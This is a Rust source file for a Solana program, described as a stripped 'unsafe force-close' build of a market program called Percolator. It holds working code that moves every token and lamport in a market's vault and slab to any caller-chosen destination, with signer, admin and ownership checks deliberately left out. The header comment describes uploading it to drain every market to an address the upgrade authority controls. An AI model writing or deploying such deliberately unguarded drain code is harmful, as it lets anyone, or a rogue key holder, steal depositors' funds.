//! Percolator: MINIMAL UNSAFE FORCE-CLOSE.
//!
//! One-instruction stripped program for the `unsafe_forced_close`
//! branch. Drains the slab's lamports and the vault's SPL tokens into
//! a destination account. No signer check, no admin check, no PDA
//! verification beyond what SPL Token requires for signing. Whoever
//! controls the BPF upgrade authority is expected to upload this,
//! drain every market to an address they control, then re-upload the
//! real program (or freeze the program id).
//!
//! Instruction data:
//!   [0]        tag = 0xFF
//!   [1]        vault_authority bump (u8)
//!
//! Accounts:
//!   0. destination             — writable  (receives SOL)
//!   1. destination_token_dest  — writable  (receives drained tokens; SPL token acct)
//!   2. slab                    — writable  (lamports drained)
//!   3. vault                   — writable  (SPL token account)
//!   4. vault_authority         — PDA [b"vault", slab.key, bump]
//!   5. token_program           — SPL Token
//!
//! No ownership, signer, or identity checks are performed.

#![no_std]

extern crate alloc;

use alloc::{format, vec::Vec};
use solana_program::{
    account_info::AccountInfo,
    entrypoint,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    program::invoke_signed,
    program_error::ProgramError,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

const SPL_TOKEN_ID: Pubkey = solana_program::pubkey!("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");

fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    data: &[u8],
) -> ProgramResult {
    if data.len() < 2 {
        return Err(ProgramError::InvalidInstructionData);
    }
    let bump = data[1];

    if accounts.len() < 6 {
        return Err(ProgramError::NotEnoughAccountKeys);
    }
    let destination = &accounts[0];
    let dest_token = &accounts[1];
    let slab = &accounts[2];
    let vault = &accounts[3];
    let vault_auth = &accounts[4];
    let token_program = &accounts[5];

    let slab_key_bytes = slab.key.to_bytes();
    let seeds: &[&[u8]] = &[b"vault", slab_key_bytes.as_ref(), core::slice::from_ref(&bump)];

    // Read vault token balance (SPL token account: amount at bytes 64..72).
    let vault_balance: u64 = {
        let d = vault.try_borrow_data()?;
        if d.len() >= 72 {
            let mut b = [0u8; 8];
            b.copy_from_slice(&d[64..72]);
            u64::from_le_bytes(b)
        } else {
            0
        }
    };

    // Drain tokens: vault → dest_token.
    if vault_balance > 0 {
        let mut ix_data = [0u8; 9];
        ix_data[0] = 3; // Transfer
        ix_data[1..9].copy_from_slice(&vault_balance.to_le_bytes());
        let ix = Instruction {
            program_id: SPL_TOKEN_ID,
            accounts: metas(&[
                (*vault.key, false, true),
                (*dest_token.key, false, true),
                (*vault_auth.key, true, false),
            ]),
            data: ix_data.to_vec(),
        };
        invoke_signed(
            &ix,
            &[vault.clone(), dest_token.clone(), vault_auth.clone(), token_program.clone()],
            &[seeds],
        )?;
    }

    // Close vault token account → lamports to destination.
    {
        let ix = Instruction {
            program_id: SPL_TOKEN_ID,
            accounts: metas(&[
                (*vault.key, false, true),
                (*destination.key, false, true),
                (*vault_auth.key, true, false),
            ]),
            data: [9u8].to_vec(), // CloseAccount
        };
        invoke_signed(
            &ix,
            &[vault.clone(), destination.clone(), vault_auth.clone(), token_program.clone()],
            &[seeds],
        )?;
    }

    // Drain slab lamports → destination. Runtime GCs accounts with
    // zero lamports at end of transaction; program-owned slab is free
    // to have its lamports moved by us directly, no CPI needed.
    if slab.owner == program_id {
        let slab_lamports = slab.lamports();
        if slab_lamports > 0 {
            **destination.try_borrow_mut_lamports()? = destination
                .lamports()
                .saturating_add(slab_lamports);
            **slab.try_borrow_mut_lamports()? = 0;
        }
    }

    Ok(())
}

fn metas(entries: &[(Pubkey, bool, bool)]) -> Vec<AccountMeta> {
    entries
        .iter()
        .map(|(k, signer, writable)| {
            if *writable {
                AccountMeta::new(*k, *signer)
            } else {
                AccountMeta::new_readonly(*k, *signer)
            }
        })
        .collect()
}
